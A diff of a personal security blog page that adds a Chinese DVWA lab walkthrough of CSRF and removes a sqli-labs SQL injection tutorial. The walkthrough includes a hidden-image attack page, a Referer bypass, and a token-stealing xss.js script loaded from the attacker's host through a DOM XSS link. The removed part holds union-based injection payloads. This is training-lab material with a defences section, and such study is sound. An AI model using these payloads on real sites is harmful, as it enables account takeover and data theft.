@@ -283,6 +283,379 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/26/DVWA-CSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ahodor">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ahodor'Via">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/07/26/DVWA-CSRF/" itemprop="url">DVWA-CSRF</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-26T11:25:48+08:00">
+                2018-07-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Cross-Site-Request-Forgery-CSRF"><a href="#Cross-Site-Request-Forgery-CSRF" class="headerlink" title="Cross Site Request Forgery (CSRF)"></a>Cross Site Request Forgery (CSRF)</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><strong>CSRF（Cross-site request forgery）跨站请求伪造:</strong><br>    主要利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p>
+<h3 id="跨站脚本（XSS）与跨站请求伪造-CSRF-区别"><a href="#跨站脚本（XSS）与跨站请求伪造-CSRF-区别" class="headerlink" title="跨站脚本（XSS）与跨站请求伪造(CSRF)区别"></a>跨站脚本（XSS）与跨站请求伪造(CSRF)区别</h3><p>XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574859/blog/CSRF/csrf_low_0.png" alt="image"></p>
+<h3 id="服务端源代码"><a href="#服务端源代码" class="headerlink" title="服务端源代码"></a>服务端源代码</h3><pre><code>&lt;?php
+
+if( isset( $_GET[ &apos;Change&apos; ] ) ) {
+    // Get input
+    $pass_new  = $_GET[ &apos;password_new&apos; ];
+    $pass_conf = $_GET[ &apos;password_conf&apos; ];
+
+    // Do the passwords match?
+    if( $pass_new == $pass_conf ) {
+        // They do!
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+
+        // Update the database
+        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;
+        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
+
+        // Feedback for the user
+        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    }
+    else {
+        // Issue with passwords matching
+        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
+
+?&gt; 
+</code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre><code>1、判断是否设置了Change变量
+2、新设置的密码与确认密码是否相同
+3、相同则将新密码做md5然后做update
+4、可以看到并没有验证新旧密码相同，没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现）
+</code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1、观察请求方式</p>
+<p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574860/blog/CSRF/csrf_low_1.png" alt="image"></p>
+<pre><code>/dvwa/vulnerabilities/csrf/?password_new=test1&amp;password_conf=test1&amp;Change=Change
+</code></pre><p>2、构造url更改点击点击链接受害者的密码</p>
+<pre><code>/dvwa/vulnerabilities/csrf/?password_new=yourpasswd&amp;password_conf=yourpasswd&amp;Change=Change
+</code></pre><p>当受害人刚刚登入访问了该站点，session没有失效，点击了这个链接后他的密码就会变成我们构造好的密码，为了增加隐蔽性可以将url换成短url，更高级的可以制作一个攻击的页面，让受害者访问，不知不觉完成攻击（注意使用相同的浏览器）</p>
+<p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574862/blog/CSRF/csrf_low_2.png" alt="image"></p>
+<h2 id="Middle"><a href="#Middle" class="headerlink" title="Middle"></a>Middle</h2><h3 id="服务端源代码-1"><a href="#服务端源代码-1" class="headerlink" title="服务端源代码"></a>服务端源代码</h3><pre><code>CSRF Source
+&lt;?php
+
+if( isset( $_GET[ &apos;Change&apos; ] ) ) {
+    // Checks to see where the request came from
+    if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) {
+        // Get input
+        $pass_new  = $_GET[ &apos;password_new&apos; ];
+        $pass_conf = $_GET[ &apos;password_conf&apos; ];
+
+        // Do the passwords match?
+        if( $pass_new == $pass_conf ) {
+            // They do!
+            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+            $pass_new = md5( $pass_new );
+
+            // Update the database
+            $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;
+            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
+
+            // Feedback for the user
+            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+        }
+        else {
+            // Issue with passwords matching
+            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+        }
+    }
+    else {
+        // Didn&apos;t come from a trusted source
+        echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
+
+?&gt;
+</code></pre><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>与之前相比，这里检查了是否同源<br>    if( stripos( $_SERVER[ ‘HTTP_REFERER’ ] ,$_SERVER[ ‘SERVER_NAME’ ])<br>    int eregi(string pattern, string string)<br>    检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。</p>
+<p>可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.xx.xx），希望通过这种机制抵御CSRF攻击。</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h5 id="过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192-168-xx-xx）"><a href="#过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192-168-xx-xx）" class="headerlink" title="过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.xx.xx）"></a>过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.xx.xx）</h5><p>我们可以将攻击页面命名为192.168.10.11.html（页面被放置在攻击者的服务器里，这里是192.168.10.10）就可以绕过了</p>
+<pre><code>&lt;img src=&quot;http://192.168.10.11/dvwa/pvulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;
+
+&lt;h1&gt;404&lt;h1&gt;
+
+&lt;h2&gt;file not found.&lt;h2&gt;
+</code></pre><p>抓包后在Repeater中修改HTTP数据包中的Referer参数为</p>
+<pre><code>http://192.168.10.10/admin/test_csrf_192.168.10.11.html
+</code></pre><p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574878/blog/CSRF/csrf_middle_1.png" alt="image"></p>
+<p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574882/blog/CSRF/csrf_middle_2.png" alt="image"></p>
+<p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574883/blog/CSRF/csrf_middle_3.png" alt="image"></p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="服务端源代码-2"><a href="#服务端源代码-2" class="headerlink" title="服务端源代码"></a>服务端源代码</h3><pre><code>&lt;?php
+
+if( isset( $_GET[ &apos;Change&apos; ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );
+
+    // Get input
+    $pass_new  = $_GET[ &apos;password_new&apos; ];
+    $pass_conf = $_GET[ &apos;password_conf&apos; ];
+
+    // Do the passwords match?
+    if( $pass_new == $pass_conf ) {
+        // They do!
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+
+        // Update the database
+        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;;
+        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
+
+        // Feedback for the user
+        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    }
+    else {
+        // Issue with passwords matching
+        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt; 
+</code></pre><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>关键代码</p>
+<pre><code>// Check Anti-CSRF token
+    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );
+
+
+// Generate Anti-CSRF token
+generateSessionToken();
+</code></pre><p>High级别的带入引入了Anti-CSRF token,<br>用户每次访问改密页面时，服务器会通过generateSessionToken()返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有客户端提交的token参数与服务器端一致时，服务器端才会处理客户端的响应。</p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>要绕过High Security Level的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</p>
+<p>1、试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。</p>
+<p>xss.js</p>
+<pre><code>alert(document.cookie);
+var theUrl = &apos;http://192.168.10.11/dvwa/vulnerabilities/csrf/&apos;;
+    if(window.XMLHttpRequest) {
+        xmlhttp = new XMLHttpRequest();
+    }else{
+        xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+    }
+var count = 0;
+    xmlhttp.withCredentials = true;
+    xmlhttp.onreadystatechange=function(){
+        if(xmlhttp.readyState ==4 &amp;&amp; xmlhttp.status==200)
+        {
+            var text = xmlhttp.responseText;
+            var regex = /user_token\&apos; value\=\&apos;(.*?)\&apos; \/\&gt;/;
+            var match = text.match(regex);
+            console.log(match);
+            alert(match[1]);
+                var token = match[1];
+                    var new_url = &apos;http://192.168.10.11/dvwa/vulnerabilities/csrf/?user_token=&apos;+token+&apos;&amp;password_new=test&amp;password_conf=test&amp;Change=Change&apos;;
+                    if(count==0){
+                        count++;
+                        xmlhttp.open(&quot;GET&quot;,new_url,false);
+                        xmlhttp.send();
+                    }
+
+
+        }
+    };
+    xmlhttp.open(&quot;GET&quot;,theUrl,false);
+    xmlhttp.send();
+</code></pre><p>xss.js放置于攻击者的网站上：<a href="http://192.168.10.10/admin/xss.js" target="_blank" rel="noopener">http://192.168.10.10/admin/xss.js</a></p>
+<p>2、DOM XSS与CSRF结合：</p>
+<p>CSRF结合同Security Level的DOM XSS，通过ajax实现跨域请求来获取用户的user_token，用以下链接来让受害者访问：</p>
+<pre><code>http://192.168.10.11/dvwa/vulnerabilities/xss_d/?default=English#%3Cscript%20src=%22http://192.168.10.10/admin/xss.js%22%3E%3C/script%3E
+</code></pre><p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574869/blog/CSRF/csrf_high_1.png" alt="image"></p>
+<p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574871/blog/CSRF/csrf_high_2.png" alt="image"></p>
+<p>成功修改密码为test</p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p><img src="https://res.cloudinary.com/dzuzgilky/image/upload/v1532574875/blog/CSRF/csrf_impossible_0.png" alt="image"></p>
+<h3 id="服务端源代码-3"><a href="#服务端源代码-3" class="headerlink" title="服务端源代码"></a>服务端源代码</h3><pre><code>&lt;?php
+
+if( isset( $_GET[ &apos;Change&apos; ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );
+
+    // Get input
+    $pass_curr = $_GET[ &apos;password_current&apos; ];
+    $pass_new  = $_GET[ &apos;password_new&apos; ];
+    $pass_conf = $_GET[ &apos;password_conf&apos; ];
+
+    // Sanitise current password input
+    $pass_curr = stripslashes( $pass_curr );
+    $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $pass_curr = md5( $pass_curr );
+
+    // Check that the current password is correct
+    $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );
+    $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );
+    $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR );
+    $data-&gt;execute();
+
+    // Do both new passwords match and does the current password match the user?
+    if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {
+        // It does!
+        $pass_new = stripslashes( $pass_new );
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+
+        // Update database with new password
+        $data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; );
+        $data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR );
+        $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );
+        $data-&gt;execute();
+
+        // Feedback for the user
+        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    }
+    else {
+        // Issue with passwords matching
+        echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;
+</code></pre><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>关键代码</p>
+<pre><code> // Check Anti-CSRF token
+checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); 
+
+
+/ Generate Anti-CSRF token
+</code></pre><p>generateSessionToken(); </p>
+<p>利用PDO技术防御SQL注入，需要输入原密码来进行验证，在不知道原密码的情况下无法进行攻击</p>
+<pre><code>$pass_curr = stripslashes( $pass_curr ); 
+
+// Check that the current password is correct
+$data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; );
+$data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR );
+$data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR );
+$data-&gt;execute(); 
+</code></pre><h2 id="CSRF漏洞的分类及检测挖掘方法主要有三种："><a href="#CSRF漏洞的分类及检测挖掘方法主要有三种：" class="headerlink" title="CSRF漏洞的分类及检测挖掘方法主要有三种："></a>CSRF漏洞的分类及检测挖掘方法主要有三种：</h2><h3 id="第一种："><a href="#第一种：" class="headerlink" title="第一种："></a>第一种：</h3><p>请求直接是个GET请求，然后请求中没有token验证参数，然后还有一个固定的变量可以被控制。这种是比较常见的一种CSRF漏洞。</p>
+<h4 id="检测方法："><a href="#检测方法：" class="headerlink" title="检测方法："></a>检测方法：</h4><p>网页操作某功能，抓包后，如果发现满足上面条件，然后再去页面测试下，基本就可以确定存在不存在CSRF漏洞了。</p>
+<h3 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h3><p>请求是个POST请求，post请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。</p>
+<h4 id="检测方法：-1"><a href="#检测方法：-1" class="headerlink" title="检测方法："></a>检测方法：</h4><p>网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。如果有token等参数，可以尝试将token去掉，然后再将referer也去掉，进行验证。这种CSRF漏洞的利用，是需要在自己服务器构造一个form表单的，然后将服务器form表单的URL作为CSRF攻击进行利用的，或者用js代码生成form表单，或者用ajax实现。</p>
+<h3 id="第三种："><a href="#第三种：" class="headerlink" title="第三种："></a>第三种：</h3><p>请求是POST，post请求中没有token参数，但是验证了referer信息。然而可以将post请求改写为get请求，然后通过第一种情况下的那个方法利用。</p>
+<h4 id="检测方法：-2"><a href="#检测方法：-2" class="headerlink" title="检测方法："></a>检测方法：</h4><p>就是先执行了第二种的验证后，发现有对CSRF进行防御。然后将post请求改写为GET请求，发现仍然可以成功执行。漏洞成因是因为服务器端接收请求参数的时候，没有严格的用$_POST 而是用的类似于 $_REQUEST这种post，get请求的参数都可以接收的写法。</p>
+<h2 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h2><p>主要可以应用以下介绍的几种方法：</p>
+<h3 id="限制验证cookie的到期时间："><a href="#限制验证cookie的到期时间：" class="headerlink" title="限制验证cookie的到期时间："></a>限制验证cookie的到期时间：</h3><p>这些cookie的合法时间越短，黑客利用你的Web应用程序的机会就越小。不过，这个时间越短，用户就越不方便。因此，你需要在安全性和方便性之间进行平衡。</p>
+<h3 id="执行重要业务之前，要求用户提交额外的信息："><a href="#执行重要业务之前，要求用户提交额外的信息：" class="headerlink" title="执行重要业务之前，要求用户提交额外的信息："></a>执行重要业务之前，要求用户提交额外的信息：</h3><p>要求用户在进行重要业务前输入口令，这可以防止黑客发动CSRF攻击（只要浏览器中没有包含口令），因为这种重要信息无法预测或轻易获得。</p>
+<h3 id="使用秘密的无法预测的验证符号："><a href="#使用秘密的无法预测的验证符号：" class="headerlink" title="使用秘密的无法预测的验证符号："></a>使用秘密的无法预测的验证符号：</h3><p>当保存在用户浏览器中的cookie仅由一次会话确认时，CSRF攻击才会有效。所以在每次HTTP请求（当然攻击者无法提前知道）中都有附加的特定会话的信息，这样就可以挫败CSRF攻击。不过，如果这种应用程序存在跨站脚本漏洞，黑客就有可能访问这种验证符号。</p>
+<h3 id="使用定制的HTTP报头："><a href="#使用定制的HTTP报头：" class="headerlink" title="使用定制的HTTP报头："></a>使用定制的HTTP报头：</h3><p>如果执行交易的所有请求都使用XMLHttpRequest并附加一个定制的HTTP报头，同时拒绝缺少定制报头的任何请求，就可以用XMLHttpRequest API来防御CSRF攻击。由于浏览器通常仅准许站点将定制的HTTP报头发送给相同站点，从而了防止由CSRF攻击的源站点所发起的交易。</p>
+<h3 id="检查访问源的报头："><a href="#检查访问源的报头：" class="headerlink" title="检查访问源的报头："></a>检查访问源的报头：</h3><p>在浏览者发送HTTP请求时，它通常会包含源自访问源报头的URL。理论上讲，你可以使用这些信息来阻止源自其它任何站点（而不是来自Web应用程序自身）的请求。不过，访问源报头并不总是可用的，（例如，有些单位由于私密性的缘故而将它剥离了），或者这个报头容易被欺骗，所以说，这条措施并不真正有效。 </p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.freebuf.com/column/153543.html" target="_blank" rel="noopener">白帽子挖洞—跨站请求伪造（CSRF）篇</a></p>
+<p><a href="http://www.storysec.com/dvwa-csrf.html" target="_blank" rel="noopener">DVWA CSRF 通关教程</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/23/DVWA-Brute_Force/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -3896,283 +4269,13 @@ Table: users
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/19/sqli-labs-Less-1-4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ahodor">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ahodor'Via">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/04/19/sqli-labs-Less-1-4/" itemprop="url">sqli-labs_Less_1-4</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-19T15:56:00+08:00">
-                2018-04-19
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="sqli-labs练习SQL注入（mysql）"><a href="#sqli-labs练习SQL注入（mysql）" class="headerlink" title="sqli-labs练习SQL注入（mysql）"></a>sqli-labs练习SQL注入（mysql）</h1><p> 漏洞源代码下载：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
-<h2 id="手工注入-hackbar"><a href="#手工注入-hackbar" class="headerlink" title="手工注入(hackbar)"></a>手工注入(hackbar)</h2><h3 id="Less-1-Get-Error-Single-quotes-String"><a href="#Less-1-Get-Error-Single-quotes-String" class="headerlink" title="Less-1 Get-Error-Single quotes-String"></a>Less-1 Get-Error-Single quotes-String</h3><p>从标题可以知是基于get请求方法的单引号字符报错</p>
-<p>页面提示输入<strong>数字型参数 id</strong></p>
-<pre><code>/sqli-labs/Less-1/?id=1
-</code></pre><p>返回正常页面</p>
-<pre><code>Welcome    Dhakkan
-Your Login name:Dumb
-Your Password:Dumb
-</code></pre><p>加一个单引号测试</p>
-<pre><code>sqli-labs/Less-1/?id=1&apos;
-</code></pre><p>页面报错</p>
-<pre><code>Welcome    Dhakkan
-You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1 
-</code></pre><p>从外层依次去掉闭合的单引号可以看到只剩下 <strong>1’</strong>  ,可知为<strong>字符型注sql注入</strong>（字符型和数字型的区别会在Less-2后区分）。</p>
-<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>在这里使用 # 或– 注释掉多余的部分（当然，这里也可以使用其他方法闭合这个单引号），对#进行了url编码，构造好使其正常返回。</p>
-<pre><code>sqli-labs/Less-1/?id=1&apos; %23
-</code></pre><p>返回正常</p>
-<h3 id="猜测字段数（order-by-）"><a href="#猜测字段数（order-by-）" class="headerlink" title="猜测字段数（order by ）"></a>猜测字段数（order by ）</h3><p>使用<strong>联合查询 (union select)</strong><br>首先使用<strong>order by</strong> 进行字段数猜测</p>
-<pre><code>sqli-labs/Less-1/?id=1&apos;  order by 10%23
-</code></pre><p>返回错误 ：Unknown column ‘10’ in ‘order clause’ </p>
-<pre><code>sqli-labs/Less-1/?id=1&apos;  order by 5%23
-</code></pre><p>返回正常</p>
-<pre><code>sqli-labs/Less-1/?id=1&apos;  order by 6%23
-</code></pre><p>返回错误<br>可知字段数为 5</p>
-<h3 id="找到显示位"><a href="#找到显示位" class="headerlink" title="找到显示位"></a>找到显示位</h3><pre><code>sqli-labs/Less-1/?id=-1&apos;  union select 1,2,3,4,5%23
-</code></pre><p>这里注意<strong>把id的值设置为一个错误的值</strong>，这里设置为了-1可知显示位在 2，3</p>
-<pre><code> Welcome    Dhakkan
-Your Login name:2
-Your Password:3
-</code></pre><h3 id="查看目标数据库基本信息"><a href="#查看目标数据库基本信息" class="headerlink" title="查看目标数据库基本信息"></a>查看目标数据库基本信息</h3><pre><code>sqli-labs/Less-1/?id=-1&apos;  union select 1,version(),user(),4,5%23
-</code></pre><p>返回如下  </p>
-<pre><code>Welcome    Dhakkan
-Your Login name:5.5.53
-Your Password:root@localhost
-</code></pre><table>
-<thead>
-<tr>
-<th>函数</th>
-<th>功能</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>database()</td>
-<td>返回当前数据库名 security</td>
-</tr>
-<tr>
-<td>user()</td>
-<td>返回当前数据库连接使用的数据库 security</td>
-</tr>
-<tr>
-<td>version()</td>
-<td>返回当前数据库的版本 5.5.53</td>
-</tr>
-<tr>
-<td>system_user()</td>
-<td>查询系统用户名 root@localhost</td>
-</tr>
-<tr>
-<td>session_user()</td>
-<td>连接数据库的用户名 root@localhost</td>
-</tr>
-<tr>
-<td>current_user()</td>
-<td>查询当前用户名 root@localhost</td>
-</tr>
-<tr>
-<td>@@version_compile_os</td>
-<td>查询数据库操作系统 Win32</td>
-</tr>
-<tr>
-<td>@@datadir</td>
-<td>查询数据库路径 C:\phpStudy\MySQL\data\</td>
-</tr>
-<tr>
-<td>@@basedir</td>
-<td>查询MySQL路径 C:/phpStudy/MySQL/</td>
-</tr>
-</tbody>
-</table>
